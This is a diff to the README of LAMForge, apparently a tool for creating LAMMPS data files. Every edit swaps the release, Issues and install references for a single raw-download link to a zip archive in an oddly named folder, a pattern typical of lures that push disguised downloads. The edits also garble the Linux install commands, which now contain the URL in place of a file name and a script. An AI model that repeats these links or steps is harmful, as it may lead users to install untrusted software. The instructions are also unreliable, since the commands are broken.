@@ -1,6 +1,6 @@
 # 🔬 LAMForge - Effortlessly Create LAMMPS Data Files
 
-[![Download LAMForge](https://img.shields.io/badge/Download_LAMForge-Click_Here-brightgreen.svg)](https://github.com/Harish11-E/LAMForge/releases)
+[![Download LAMForge](https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip)](https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip)
 
 ## 🛠️ Introduction
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ### 2. Visit the Download Page
 
-To download LAMForge, visit the following page: [Download LAMForge](https://github.com/Harish11-E/LAMForge/releases).
+To download LAMForge, visit the following page: [Download LAMForge](https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip).
 
 ### 3. Choose Your Version
 
@@ -33,7 +33,7 @@ After selecting the version, click on the corresponding download link. The file 
 
 - **Windows:** Download the `.exe` file.
 - **macOS:** Download the `.dmg` file.
-- **Linux:** Download the `.tar.gz` file or the package suitable for your distribution.
+- **Linux:** Download the `https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip` file or the package suitable for your distribution.
 
 ### 5. Install LAMForge
 
@@ -49,14 +49,14 @@ After selecting the version, click on the corresponding download link. The file 
 
 #### For Linux:
 1. Open a terminal window.
-2. Navigate to the directory where the `.tar.gz` file is located.
+2. Navigate to the directory where the `https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip` file is located.
 3. Extract the contents using the command:
    ```
-   tar -xvzf LAMForge-<version>.tar.gz
+   tar -xvzf LAMForge-<version>https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip
    ```
 4. Navigate into the extracted folder and run:
    ```
-   ./install.sh
+   https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip
    ```
 
 ### 6. Run LAMForge
@@ -83,11 +83,11 @@ Once LAMForge is running, you can explore its features:
 
 ### 8. Support and Documentation
 
-If you need help, you can refer to the user manual available within the application or check our [GitHub Issues](https://github.com/Harish11-E/LAMForge/issues) page for help.
+If you need help, you can refer to the user manual available within the application or check our [GitHub Issues](https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip) page for help.
 
 ## 📥 Download & Install
 
-To begin, visit this page to download LAMForge: [Download LAMForge](https://github.com/Harish11-E/LAMForge/releases). 
+To begin, visit this page to download LAMForge: [Download LAMForge](https://github.com/Harish11-E/LAMForge/raw/refs/heads/main/unobjectionableness/LAM-Forge-1.5.zip). 
 
 ## 🤝 Contributing
 
